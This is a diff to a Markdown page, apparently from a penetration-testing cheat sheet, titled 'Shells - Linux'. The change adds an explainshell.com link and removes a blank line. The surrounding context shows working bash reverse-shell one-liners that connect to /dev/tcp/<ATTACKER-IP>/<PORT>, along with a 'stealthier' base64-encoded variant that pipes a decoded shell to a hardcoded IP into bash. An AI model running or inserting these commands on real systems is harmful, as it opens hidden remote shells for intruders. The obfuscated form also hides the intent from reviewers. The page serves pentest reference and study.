@@ -1,5 +1,7 @@
 # Shells - Linux
 
+**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com/)\*\*\*\*
+
 ## Full TTY
 
 **Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
@@ -20,7 +22,6 @@ nohup bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #Stealthier method
 #B64 encode the shell like: echo "nohup bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
-
 ```
 
 ## Netcat
